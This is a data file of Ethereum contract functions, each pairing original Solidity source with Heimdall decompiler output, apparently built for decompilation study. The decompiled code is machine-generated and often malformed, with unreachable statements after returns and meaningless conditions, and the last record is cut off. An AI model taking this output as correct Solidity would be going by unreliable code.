{"contract_address": "0x5Ba89777D1172C70F410d74dBBeF55150B44Da28", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x060f7a607bAd24a75EC072b96C1a209A80ca62ed", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x6C582560fE845680fA8fFC628a9Ae666008111f4", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function enableTrading() external onlyOwner {enabledTrading = true;}", "heimdall_decompiled_code": "function enableTrading() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: Caller is not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x4f776e61626c653a2043616c6c6572206973206e6f74206f776e657200000000;\n        uniPairAddy = 0x010000000000000000000000000000000000000000 | (uint248(uniPairAddy));\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setKing(uint256 newValue) public onlyOwner {\r\n        kill = newValue;\r\n    }", "heimdall_decompiled_code": "function setKing(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        kill = arg0;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x22;\n        address var_c = !(!bytes1(storage_map_e[var_a]));\n        return !(!bytes1(storage_map_e[var_a]));\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_aa) {\n            if (!(store_aa) == ((store_aa / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_aa / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_aa / 0x02;\n                if (store_aa) {\n                    if (!(store_aa) == ((store_aa / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_aa / 0x02) {\n                            if (0x1f < (store_aa / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_aa / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xeA1F21c4f9BDA00BEDB5871E6C0de6746E1e2929", "original_solidity_code": "function unpause() external virtual onlyOwner {\r\n        super._unpause();\r\n    }", "heimdall_decompiled_code": "function unpause() public {\n        require(address(owner / 0x0100) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(bytes1(owner / 0x01), \"Pausable: not paused\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_d = 0x14;\n        var_e = 0x5061757361626c653a206e6f7420706175736564000000000000000000000000;\n        owner = (0 * 0x01) | (uint248(owner));\n        address var_a = address(msg.sender);\n        emit Unpaused(address(msg.sender));\n    }"}
{"contract_address": "0x0056aC5defc0F8380b9d2B351c3C23b23A852082", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_h = 0x01000000000000000000000000000000000000000000 | (uint248(store_h));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_g), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_g);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_g), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_g).code.length);\n        (bool success, bytes memory ret0) = address(store_g).Unresolved_791ac947(var_l); // call\n        store_h = uint248(store_h);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function OceanBreezeWave(address spender, uint256 sumValue) public virtual returns (bool) {\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + sumValue);\\n        return true;\\n    }", "heimdall_decompiled_code": "function OceanBreezeWave(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (killb) {\n            if (!(killb) == ((killb >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (killb >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = killb >> 0x01;\n                if (killb) {\n                    if (!(killb) == ((killb >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!killb >> 0x01) {\n                            if (0x1f < (killb >> 0x01)) {\n                                var_a = 0x02;\n                                var_e = storage_map_t[var_a];\n                                if ((0x20 + var_c) + (killb >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9EbFcFb424f91eE2F8f143cc4430e9E1E2E80939", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (0x0a) {\n                        if (0x0a == 0x01) {\n                            if (0x0a == 0x02) {\n                                if (!0x09 > 0xff) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                        if (!0x09 > 0x01) {\n                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_f = 0x11;\n                                                    if (!0x01) {\n                                                    }\n                                                    if (0x0a) {\n                                                        if (0x0a == 0x01) {\n                                                            if (0x0a == 0x02) {\n                                                                if (!0x09 > 0xff) {\n                                                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_f = 0x11;\n                                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xAe2D518A7c2fE465D3548825De14774282959862", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _Tokename;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9A6B50E7dacC9E3ac83c65e6c84e39Ff247D27Ab", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(address(this) == (address(msg.sender)));\n        require(address(store_a) == (address(msg.sender)));\n        require((0 == ((0 * arg1) / arg1)) | !arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(arg0);\n        var_b = 0;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        store_a = 0x010000000000000000000000000000000000000000 | (uint248(store_a));\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_g = address(this);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_h = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;\n        require(0x12);\n        require((0x01 == 0x01) | !0x0165a0bc00);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_i = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_j = 0x03938700;\n        uint256 var_k = 0;\n        var_l = 0xa0;\n        uint256 var_m = var_e.length;\n        address var_n = address(this);\n        uint256 var_o = block.timestamp;\n        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).Unresolved_791ac947(var_j); // call\n        (bool success, bytes memory ret0) = address(0xa817a2a7f96aa533f90f8a8468104fd3c5fda15f).transfer(address(this).balance);\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                require(0x0a);\n                require(0x0a == 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(0x0a == 0x02);\n                require(!0x12 > 0xff);\n                require(!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20)));\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x12 > 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            }\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0xf4B4346B0E2220371B87bD140b89E4a4E57c10B7", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0F92AD5f9f111618AAE7F963c44B862A3e24f48c", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[2271:2305];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[2420:2456];\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function ownerOf(uint256 tokenId) public view virtual override returns (address) {\\n        return address(uint160(_packedOwnershipOf(tokenId)));\\n    }", "heimdall_decompiled_code": "function ownerOf(uint256 arg0) public view returns (address) {\n        require(0x01 > arg0, CustomError_df2d9b42());\n        require(!(arg0 < totalSupply), CustomError_df2d9b42());\n        uint256 var_a = arg0;\n        var_b = 0x04;\n        require(bytes1(storage_map_n[var_a]), CustomError_df2d9b42());\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        require(storage_map_n[var_a], CustomError_df2d9b42());\n        uint256 var_c = address(storage_map_n[var_a]);\n        return address(storage_map_n[var_a]);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg0;\n        var_b = 0x04;\n        require(storage_map_n[var_a], CustomError_df2d9b42());\n        var_c = address(storage_map_n[var_a]);\n        return address(storage_map_n[var_a]);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg0);\n        var_b = 0x04;\n        require(storage_map_n[var_a], CustomError_df2d9b42());\n        var_c = address(storage_map_n[var_a]);\n        return address(storage_map_n[var_a]);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg0));\n        var_b = 0x04;\n        require(storage_map_n[var_a], CustomError_df2d9b42());\n        var_c = address(storage_map_n[var_a]);\n        return address(storage_map_n[var_a]);\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_d[var_a] > ~(arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_d[var_a] = storage_map_d[var_a] + arg1;\n        uint256 var_d = storage_map_d[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_d[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 